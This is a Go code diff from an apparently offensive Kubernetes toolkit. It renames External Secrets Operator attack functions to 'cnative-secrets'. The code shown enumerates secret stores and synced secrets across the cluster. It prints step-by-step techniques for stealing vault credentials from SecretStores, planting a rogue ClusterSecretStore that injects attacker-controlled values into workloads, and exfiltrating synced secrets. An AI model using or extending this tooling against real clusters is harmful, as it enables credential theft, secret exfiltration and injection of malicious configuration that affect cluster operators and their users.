@@ -23,7 +23,7 @@ var clusterSecretStoreGVR = schema.GroupVersionResource{
 	Group: "external-secrets.io", Version: "v1beta1", Resource: "clustersecretstores",
 }
 
-func detectExternalSecrets(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeSecrets(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"external-secrets", "external-secrets-system", "es-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -31,10 +31,10 @@ func detectExternalSecrets(ctx context.Context, client kubernetes.Interface) []D
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "external-secrets",
+				Name:      "cnative-secrets",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d external-secrets pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-secrets pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -44,7 +44,7 @@ func detectExternalSecrets(ctx context.Context, client kubernetes.Interface) []D
 		for _, s := range secrets.Items {
 			if _, ok := s.Labels["reconcile.external-secrets.io/created-by"]; ok {
 				return []DetectionSystem{{
-					Name:      "external-secrets",
+					Name:      "cnative-secrets",
 					Detected:  true,
 					Namespace: s.Namespace,
 					Details:   "synced secrets found (reconcile label)",
@@ -56,25 +56,25 @@ func detectExternalSecrets(ctx context.Context, client kubernetes.Interface) []D
 	return nil
 }
 
-// ExploitExternalSecrets executes the specified External Secrets Operator exploitation technique.
-func ExploitExternalSecrets(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeSecrets executes the specified cnative-secrets exploitation technique.
+func ExploitCnativeSecrets(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return externalSecretsEnumerate(ctx, client, dynClient)
+		return cnativeSecretsEnumerate(ctx, client, dynClient)
 	case "store_exploit":
-		return externalSecretsStoreExploit(ctx, client, dynClient)
+		return cnativeSecretsStoreExploit(ctx, client, dynClient)
 	case "rogue_store":
-		return externalSecretsRogueStore(ctx, dynClient)
+		return cnativeSecretsRogueStore(ctx, dynClient)
 	case "secret_exfil":
-		return externalSecretsExfil(ctx, client, dynClient)
+		return cnativeSecretsExfil(ctx, client, dynClient)
 	default:
-		return externalSecretsEnumerate(ctx, client, dynClient)
+		return cnativeSecretsEnumerate(ctx, client, dynClient)
 	}
 }
 
-func externalSecretsEnumerate(ctx context.Context, _ kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeSecretsEnumerate(ctx context.Context, _ kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("External Secrets Operator Enumeration:\n\n")
+	sb.WriteString("cnative-secrets Enumeration:\n\n")
 
 	found := false
 
@@ -126,7 +126,7 @@ func externalSecretsEnumerate(ctx context.Context, _ kubernetes.Interface, dynCl
 	}
 
 	if !found {
-		sb.WriteString("  No External Secrets resources detected\n")
+		sb.WriteString("  No cnative-secrets resources detected\n")
 	}
 
 	return &EvasionResult{
@@ -136,9 +136,9 @@ func externalSecretsEnumerate(ctx context.Context, _ kubernetes.Interface, dynCl
 	}, nil
 }
 
-func externalSecretsStoreExploit(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeSecretsStoreExploit(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("External Secrets Store Credential Exploitation:\n\n")
+	sb.WriteString("cnative-secrets Store Credential Exploitation:\n\n")
 
 	sb.WriteString("  SecretStores contain credentials to access external vaults.\n")
 	sb.WriteString("  These credentials often have broad read access to all secrets.\n\n")
@@ -205,8 +205,8 @@ func externalSecretsStoreExploit(ctx context.Context, client kubernetes.Interfac
 
 	sb.WriteString("\n  Store credential exploitation:\n")
 	sb.WriteString("    1. Extract SecretStore auth credentials from referenced K8s secrets\n")
-	sb.WriteString("    2. Use credentials to access vault directly (bypass ESO scope)\n")
-	sb.WriteString("    3. ESO credentials often have broad read access to entire vault\n")
+	sb.WriteString("    2. Use credentials to access vault directly (bypass cnative-secrets scope)\n")
+	sb.WriteString("    3. cnative-secrets credentials often have broad read access to entire vault\n")
 	sb.WriteString("    4. AWS: IAM role/keys with secretsmanager:GetSecretValue on *\n")
 	sb.WriteString("    5. Vault: token with broad path permissions for KV reads\n")
 	sb.WriteString("    6. GCP: service account with Secret Manager accessor role\n")
@@ -218,7 +218,7 @@ func externalSecretsStoreExploit(ctx context.Context, client kubernetes.Interfac
 	}, nil
 }
 
-func externalSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Rogue ClusterSecretStore Creation:\n\n")
 
@@ -228,7 +228,7 @@ func externalSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface)
 	clusterStores, err := dynClient.Resource(clusterSecretStoreGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list ClusterSecretStores: %v\n", err)
-		sb.WriteString("  ESO CRDs may not be installed\n")
+		sb.WriteString("  cnative-secrets CRDs may not be installed\n")
 		return &EvasionResult{Technique: "rogue_store", Success: false, Output: sb.String()}, nil
 	}
 
@@ -240,7 +240,7 @@ func externalSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface)
 	sb.WriteString("\n  Rogue store attack:\n")
 	sb.WriteString("    1. Create ClusterSecretStore pointing to attacker-controlled vault\n")
 	sb.WriteString("    2. Create ExternalSecret referencing rogue store in target namespace\n")
-	sb.WriteString("    3. ESO syncs attacker's values into target namespace as K8s Secret\n")
+	sb.WriteString("    3. cnative-secrets syncs attacker's values into target namespace as K8s Secret\n")
 	sb.WriteString("    4. Workloads consuming that secret now use attacker-controlled values\n")
 	sb.WriteString("    5. Inject malicious config, credentials, or cert material\n\n")
 
@@ -256,11 +256,11 @@ func externalSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface)
 	}, nil
 }
 
-func externalSecretsExfil(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeSecretsExfil(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("External Secrets Exfiltration:\n\n")
+	sb.WriteString("cnative-secrets Exfiltration:\n\n")
 
-	sb.WriteString("  ESO syncs external secrets into K8s Secrets — they're readable in-cluster.\n\n")
+	sb.WriteString("  cnative-secrets syncs external secrets into K8s Secrets — they're readable in-cluster.\n\n")
 
 	extSecrets, err := dynClient.Resource(externalSecretGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
@@ -301,7 +301,7 @@ func externalSecretsExfil(ctx context.Context, client kubernetes.Interface, dynC
 			}
 		}
 	}
-	fmt.Fprintf(&sb, "\n  ESO-managed K8s Secrets (reconcile label): %d\n", managedSecrets)
+	fmt.Fprintf(&sb, "\n  cnative-secrets-managed K8s Secrets (reconcile label): %d\n", managedSecrets)
 
 	sb.WriteString("\n  Exfiltration approach:\n")
 	sb.WriteString("    1. Read synced K8s Secrets directly (standard secret access)\n")
